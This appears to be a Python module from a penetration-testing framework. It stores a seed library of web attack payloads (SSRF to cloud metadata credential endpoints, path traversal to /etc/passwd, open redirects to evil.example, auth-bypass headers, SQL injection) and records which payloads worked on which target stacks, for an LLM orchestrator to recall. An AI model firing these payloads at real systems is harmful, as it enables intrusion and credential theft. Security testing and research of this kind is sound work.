#!/usr/bin/env python3
"""
Sovereign Blackboard Architecture - Payload Corpus

A curated, metadata-tagged payload library (researchers curate payloads; the
framework should too). Plain files + a JSON index — no database, no daemon.

  * payloads/            — .txt files, one payload per line, grouped by class
  * payloads/index.json  — metadata: class, when-to-use, provenance, stack-tags

Two-way learning:
  * `list/--search`      — the orchestrator greps instead of remembering
  * `note-worked`        — debrief (or the operator) records payload family X
                           worked on stack S; `list` ranks by proven wins
  * payload families that never work get flagged by debrief for retirement

Deterministic, zero model tokens. The LLM still decides HOW to fire payloads;
this is recall, not judgment.
"""

import argparse
import json
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path

_engine_dir = str(Path(__file__).resolve().parent)
if _engine_dir not in sys.path:
    sys.path.insert(0, _engine_dir)


def _find_engine_root():
    p = Path(__file__).resolve()
    for anc in [p.parent, *p.parents]:
        if (anc / "art.py").exists():
            return anc
    return p.parent


_ENGINE_ROOT = _find_engine_root()

PAYLOADS_DIR = _ENGINE_ROOT / "payloads"
INDEX_FILE = PAYLOADS_DIR / "index.json"

# Seed corpus (curated starter set; grows via debrief + operator additions)
SEED_PAYLOADS = {
    "ssrf": {
        "file": "ssrf.txt",
        "when": "any user-influenced URL/fetch parameter; blind versions point at oob.py probes",
        "tags": ["cloud", "internal", "metadata"],
        "lines": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_INFO",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:8080/actuator/health",
            "http://localhost:80/admin",
        ],
    },
    "traversal": {
        "file": "traversal.txt",
        "when": "file/path parameters, downloads, imports; watch for normalization differentials",
        "tags": ["lfi", "read", "windows", "linux"],
        "lines": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ],
    },
    "redirect": {
        "file": "redirect.txt",
        "when": "redirect/to/return/continue/url params; check open-redirect + header-splitting",
        "tags": ["phishing", "oauth"],
        "lines": [
            "https://evil.example/",
            "//evil.example/",
            "/\\/\\/evil.example/",
            "https://target.example@evil.example/",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "https://target.example.evil.example/",
        ],
    },
    "authbypass": {
        "file": "authbypass.txt",
        "when": "admin/gated routes: header/role/param-based bypass attempts (any-edition Burp friendly)",
        "tags": ["bac", "role", "header"],
        "lines": [
            "X-Role: admin",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Forwarded-For: 127.0.0.1",
            "X-Forwarded-Host: localhost",
            "X-Custom-IP-Authorization: 127.0.0.1",
            "Referer: /admin",
            "role=admin&isAdmin=true&admin=1",
        ],
    },
    "sqli": {
        "file": "sqli.txt",
        "when": "any db-backed parameter; start error-based, escalate blind/time-based",
        "tags": ["auth", "union", "blind"],
        "lines": [
            "' OR '1'='1",
            "' OR 1=1-- -",
            "1' ORDER BY 10-- -",
            "1 UNION SELECT NULL,NULL-- -",
            "1' AND SLEEP(5)-- -",
            "1'; SELECT pg_sleep(5)-- -",
            "\\\" OR 1=1-- -",
            "1' AND (SELECT 1)=1-- -",
        ],
    },
}

# Proven-wins ledger: family -> stack -> {wins, losses} (global, cross-engagement)
WINS_FILE = Path.home() / ".artifactory" / "payload_wins.json"


def ensure_corpus():
    PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)
    if not INDEX_FILE.exists():
        index = {}
        for cls, spec in SEED_PAYLOADS.items():
            (PAYLOADS_DIR / spec["file"]).write_text("\n".join(spec["lines"]) + "\n")
            index[cls] = {
                "file": spec["file"],
                "when": spec["when"],
                "tags": spec["tags"],
                "provenance": "artifactory seed corpus (evolves via debrief)",
                "added": datetime.now(timezone.utc).isoformat()[:10],
            }
        INDEX_FILE.write_text(json.dumps(index, indent=2))
        print(f"[✔] Seed corpus written: {len(index)} class(es) under payloads/")
    return json.loads(INDEX_FILE.read_text())


def list_classes(pattern: str = ""):
    index = ensure_corpus()
    wins = _load_wins()
    matches = [c for c in index if pattern.lower() in c.lower()] if pattern else list(index)
    if not matches:
        print(f"[*] No payload class matches '{pattern}'. Known: {', '.join(index)}")
        return
    for cls in matches:
        meta = index[cls]
        lines = (PAYLOADS_DIR / meta["file"]).read_text().splitlines()
        w = wins.get(cls, {})
        record = f" | wins: {sum(v['wins'] for v in w.values())}" if w else ""
        print(f"\n[{cls}] ({len(lines)} payloads{record}) — use when: {meta['when']}")
        for i, l in enumerate(lines[:6], 1):
            # per-payload win hint when fine-grained stats exist
            pw = wins.get(f"{cls}#P{i}", {})
            mark = f" (P{i} wins: {sum(v['wins'] for v in pw.values())})" if pw else ""
            print(f"  P{i}. {l}{mark}")
        if len(lines) > 6:
            print(f"  ... {len(lines) - 6} more in payloads/{meta['file']}")


def _load_wins() -> dict:
    if WINS_FILE.exists():
        try:
            return json.loads(WINS_FILE.read_text())
        except Exception:
            return {}
    return {}


def note_worked(cls: str, stack: str, worked: bool, payload_id: str = ""):
    """Record payload-family performance on a stack (from debrief or operator).
    This is what makes the corpus LEARNED, not static. `payload_id` is OPTIONAL
    per-payload granularity (P<nn> line number); families remain the primary
    grain — per-payload stats are only kept when explicitly given."""
    wins = _load_wins()
    key = cls if not payload_id else f"{cls}#{payload_id}"
    d = wins.setdefault(key, {}).setdefault(stack or "unknown", {"wins": 0, "losses": 0})
    d["wins" if worked else "losses"] += 1
    WINS_FILE.parent.mkdir(parents=True, exist_ok=True)
    WINS_FILE.write_text(json.dumps(wins, indent=2))
    print(f"[✔] Recorded: {key} {'WORKED' if worked else 'failed'} on '{stack or 'unknown'}'")


def retire_review():
    """Flag families with many losses and no wins across stacks (debrief feeds
    this). Flags only — curation stays human."""
    wins = _load_wins()
    flagged = []
    for cls, stacks in wins.items():
        w = sum(s["wins"] for s in stacks.values())
        l = sum(s["losses"] for s in stacks.values())
        if l >= 4 and w == 0:
            flagged.append((cls, l))
    if flagged:
        print("[~] Retirement candidates (never worked despite tries):")
        for cls, l in flagged:
            print(f"    {cls} — {l} loss(es) across stacks; consider replacing the family")
    else:
        print("[*] No retirement candidates yet.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Payload corpus (curated + learning)")
    sub = parser.add_subparsers(dest="cmd", required=True)
    li = sub.add_parser("list", help="List payload classes (optionally matching a pattern)")
    li.add_argument("--search", default="")
    sub.add_parser("init", help="Write the seed corpus if missing")
    nw = sub.add_parser("note", help="Record that a family (or P<nn> payload) worked/failed on a stack")
    nw.add_argument("--class", dest="cls", required=True)
    nw.add_argument("--stack", default="")
    nw.add_argument("--worked", type=lambda v: v.lower() in ("1", "true", "yes"),
                    required=True)
    nw.add_argument("--payload-id", dest="payload_id", default="",
                    help="Optional per-payload line id (e.g. P3) for fine-grained tracking")
    sub.add_parser("retire-review", help="Flag never-worked payload families")
    args = parser.parse_args()
    if args.cmd == "list":
        list_classes(args.search)
    elif args.cmd == "init":
        ensure_corpus()
    elif args.cmd == "note":
        note_worked(args.cls, args.stack, args.worked, args.payload_id)
    else:
        retire_review()
